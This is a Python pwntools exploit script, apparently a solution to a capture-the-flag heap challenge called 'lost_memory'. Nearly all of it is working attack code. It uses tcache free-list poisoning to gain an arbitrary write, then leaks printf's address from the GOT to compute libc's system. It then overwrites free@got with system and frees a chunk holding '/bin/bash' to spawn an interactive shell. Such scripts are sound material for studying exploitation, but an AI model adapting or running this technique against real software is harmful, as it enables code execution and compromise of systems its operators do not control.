from pwn import *
from time import sleep

"""1. Allocate Memory
2. Write to Memory
3. Select Index
4. Free Memory
5. Store Flag Return Value
6. Exit
Enter your choice:"""

ld = ELF("ld-linux-x86-64.so.2")
libc = ELF("libc.so.6")
elf = ELF("./lost_memory_patched")
# env = {"LD_PRELOAD": libc.path}
# p = process([ld.path, "./lost_memory"], env=env)

p = process("lost_memory_patched")

sleep(0.5)

def create(size):
    p.sendline(b"1")
    p.sendlineafter(b"What size would you like?", str(size))
    p.recv(1234)

def write(content):
    p.sendline(b"2")
    p.sendlineafter(b"What would you like to write?", content)

def free():
    p.sendline(b"4")
    p.recv(1234)

def index(idx):
    p.sendline(b"3")
    p.sendlineafter(b"Select an index to write to (0 - 9)", str(idx).encode())

def flag():
    p.sendline(b"5")
    p.recvuntil(b"Stored return value: ")
    flag = p64(int(p.recvuntil(b"Stored return value:").split(b"\nStored")[0], 16))
    
    return flag


#=================
#   fd-poison
#=================
# index(0)  default! 
create(0x18)

index(1)
create(0x18)

index(2)
create(0x18)

index(1)
free()
index(2)
free()

write(p64(0x4041e0))  # ptr[4]

create(0x18)
create(0x18)

#=================
#   leak
#=================
index(4)
create(0x1)
index(2)
write(p64(elf.got["printf"]))

index(4)
write(b"\x90")

p.recvuntil(b"ptr[memIndex] = ")
leak_printf = p.recvuntil(b"input = ").split(b"\ninput = ")[0].ljust(8, b"\x00")
system_offset = libc.symbols["printf"] - libc.symbols["system"]
system = u64(leak_printf) - system_offset

print(p64(system))

#=================
#   free@got -> acual_system
#=================

free_got = elf.got["free"]
index(4)
create(0x8)
index(2)
write(p64(free_got))
index(4)
write(p64(system))

index(0)
write("/bin/bash")

free()

# gdb.attach(p)
# input("sss")


p.interactive()
